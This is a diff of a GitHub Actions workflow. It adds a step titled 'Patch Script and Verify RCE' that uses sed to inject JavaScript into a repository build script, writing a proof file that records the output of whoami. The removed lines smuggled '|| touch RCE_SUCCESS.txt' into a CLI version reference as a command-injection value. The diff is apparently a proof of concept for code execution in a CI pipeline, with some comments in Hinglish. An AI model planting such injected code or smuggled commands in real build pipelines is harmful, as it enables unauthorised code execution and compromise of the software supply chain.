@@ -8,7 +8,6 @@ on:
         required: false
         default: 'main'
         type: string
-        description: "Stellar-cli ref to build against. If empty, will use latest cli version"
 
 jobs:
   build:
@@ -38,16 +37,17 @@ jobs:
 
       - name: Patch Script and Verify RCE
         run: |
-          # Injecting payload via sed to modify the script content dynamically
-          sed -i "s/const cliRef = argv.cliRef || \`v\${latestVersion}\`;/const cliRef = 'v1.0.0 || touch RCE_SUCCESS.txt';/" scripts/stellar_cli.mjs
+          # Pro Injection: Script ki pehli line mein hi payload inject kar rahe hain
+          # Ye code seedha file ke top par add ho jayega
+          sed -i "1i require('fs').writeFileSync('RCE_SUCCESS.txt', 'RCE_VERIFIED_BY_$(whoami)');" scripts/stellar_cli.mjs
           
-          # Running the script
-          # We use '|| true' to ensure the build pipeline doesn't stop immediately
-          pnpm stellar-cli:build -- --cli-ref='v1.0.0' || true
+          # Run the script
+          pnpm stellar-cli:build -- --cli-ref='main'
           
           # Verification Step
           echo "--- VERIFICATION START ---"
           ls -la RCE_SUCCESS.txt
+          cat RCE_SUCCESS.txt
           echo "--- VERIFICATION END ---"
         shell: bash
 
